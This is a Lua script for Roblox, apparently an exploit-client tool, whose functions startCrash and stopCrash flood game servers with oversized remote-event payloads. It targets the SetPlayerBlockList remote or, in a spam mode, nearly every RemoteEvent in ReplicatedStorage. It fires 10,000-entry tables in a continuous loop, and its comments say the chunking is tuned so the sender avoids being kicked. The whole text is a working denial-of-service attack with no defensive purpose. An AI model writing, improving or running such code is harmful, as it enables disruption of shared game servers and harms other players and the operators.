-- ═══════════ CORE LOGIC ═══════════
local TargetSize     = 180000 -- Total items to send
local ChunkSize      = 10000  -- ✅ SAFE: 10k chunks prevent Error 261 at high numbers
local Format         = "pair"

local state = { running = false, thread = nil, remote = nil, chunkCache = nil, passes = 0, isSpam = false }
local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}
local spamRemotes = {}

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

local function findSpamRemotes()
    table.clear(spamRemotes)
    local rs = game:GetService("ReplicatedStorage")
    if rs then
        for _, obj in ipairs(rs:GetDescendants()) do
            if obj:IsA("RemoteEvent") and not obj.Name:lower():match("chat") and not obj.Name:lower():match("mouse") then
                table.insert(spamRemotes, obj)
            end
        end
    end
end

local function buildChunk()
    local root = table.create(ChunkSize)
    for i = 1, ChunkSize do root[i] = { id = i, v = i * 2 } end
    return root
end

-- ✅ CHUNKING LOGIC: Safely sends data without kicking you
local function sendPayload(remote)
    if not state.chunkCache then state.chunkCache = buildChunk() end
    local chunksNeeded = math.ceil(TargetSize / ChunkSize)
    
    for _ = 1, chunksNeeded do
        pcall(function() remote:FireServer(state.chunkCache) end)
        -- Yield 0.02s between chunks to let network buffer drain
        task.wait(0.02) 
    end
    state.passes += 1
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    
    if state.isSpam then
        local chunksNeeded = math.ceil(TargetSize / ChunkSize)
        for _, r in ipairs(spamRemotes) do
            for _ = 1, chunksNeeded do
                pcall(function() r:FireServer(state.chunkCache) end)
                task.wait(0.02)
            end
        end
    else
        sendPayload(state.remote)
    end
end

local function getPing()
    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
    return ok and math.floor(p) or 0
end

local function startCrash(isSpam)
    if state.running then return end
    state.running = true
    state.isSpam = isSpam
    state.passes = 0
    
    if not state.chunkCache then state.chunkCache = buildChunk() end
    if isSpam then findSpamRemotes() end
    
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            -- Fast loop since sendPayload already yields for chunks
            task.wait(0.05) 
        end
    end)
end

local function stopCrash()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.chunkCache = nil
end

